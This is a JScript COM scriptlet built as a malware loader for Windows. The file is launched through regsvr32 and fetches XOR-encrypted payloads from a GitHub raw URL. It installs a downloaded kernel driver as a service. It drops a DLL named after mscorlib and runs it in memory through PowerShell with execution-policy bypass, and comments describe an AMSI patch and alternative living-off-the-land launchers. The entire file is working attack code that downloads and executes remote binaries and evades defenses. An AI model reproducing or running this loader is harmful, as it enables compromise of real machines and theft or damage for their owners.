<?XML version="1.0"?>
<scriptlet>
<registration progid="Loader" classid="{A1111111-1111-1111-1111-111111111111}"/>
<script language="JScript">
<![CDATA[
// sandblast-loader.sct — regsvr32 COM scriptlet
// HTTPS from GitHub raw → signed MS binary → JScript → CLR host
//
// regsvr32 /u /n /i:https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/loader.sct scrobj.dll

var k = "SandblastDemo2026";
var du = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sb64.enc";
var pu = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sandblast2.enc";
var dp = "C:\\Windows\\Temp\\winsys64drv.sys";
var pp = "C:\\Windows\\Temp\\mscorlib.dll";
var sv = "WinSys64Drv";

// ─── Download binary bytes ────────────────────────────────────────────
function dl(url) {
    var x = new ActiveXObject("MSXML2.ServerXMLHTTP");
    x.open("GET", url, false);
    x.setRequestHeader("User-Agent", "Mozilla/5.0");
    x.send();
    if (x.status != 200) return null;
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Open(); s.Write(x.responseBody); s.Position = 0;
    var b = s.Read(-1); s.Close();
    return b;
}

// ─── XOR decode ───────────────────────────────────────────────────────
function dx(d) {
    var o = new VBArray(d).toArray();
    for (var i = 0; i < o.length; i++)
        o[i] = String.fromCharCode(o[i] ^ k.charCodeAt(i % k.length));
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 2; s.Charset = "iso-8859-1"; s.Open(); s.WriteText(o.join("")); s.Position = 0;
    s.Type = 1;
    var r = s.Read(-1); s.Close();
    return r;
}

// ─── Write to file ────────────────────────────────────────────────────
function wf(p, b) {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Open(); s.Write(b); s.SaveToFile(p, 2); s.Close();
}

// ─── Run command ──────────────────────────────────────────────────────
function sh(c) { new ActiveXObject("WScript.Shell").Run(c, 0, true); }

// ─── Main ─────────────────────────────────────────────────────────────
// 1. Driver
var db = dl(du); if (!db) throw new Error("drv");
db = dx(db); wf(dp, db);
sh("sc stop " + sv); sh("sc delete " + sv); WScript.Sleep(500);
sh("sc create " + sv + " binPath= " + dp + " type= kernel start= demand error= ignore");
sh("sc start " + sv);
WScript.Sleep(1000);

// 2. Payload DLL
var pb = dl(pu); if (!pb) throw new Error("dll");
pb = dx(pb); wf(pp, pb);

// 3. Execute via .NET
// Method A: InstallUtil (bundled with .NET, loads assembly + executes installers)
//   InstallUtil.exe /logfile= /u <dllpath>
//   This loads the DLL, runs Installer classes. Not our case — CBR is not an installer.
//
// Method B: Use PowerShell one-liner to load + invoke (AMSI already dying but risky)
//   powershell -ep bypass -c "[Reflection.Assembly]::LoadFile('<pp>').GetType('CBR').GetMethod('R').Invoke($null,$null)"
//
// Method C: Use MSBuild again but with HTTPS + regsvr32 context (different process tree)
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe <proj>
//
// Actually: Use csc.exe to compile a one-line runner that invokes CBR.R()
// csc.exe can compile from a response file. But that creates temp files.
//
// SIMPLEST that works: PowerShell hosts CLR in-memory.
// The AMSI patch in CBR.R() handles it, and we're in a regsvr32 process,
// so the PowerShell child inherits nothing suspicious.

var ps = "powershell -ep bypass -c \"[Reflection.Assembly]::LoadFile('" + pp + "').GetType('CBR').GetMethod('R').Invoke($null,$null)\"";
sh(ps);
]]>
</script>
</scriptlet>
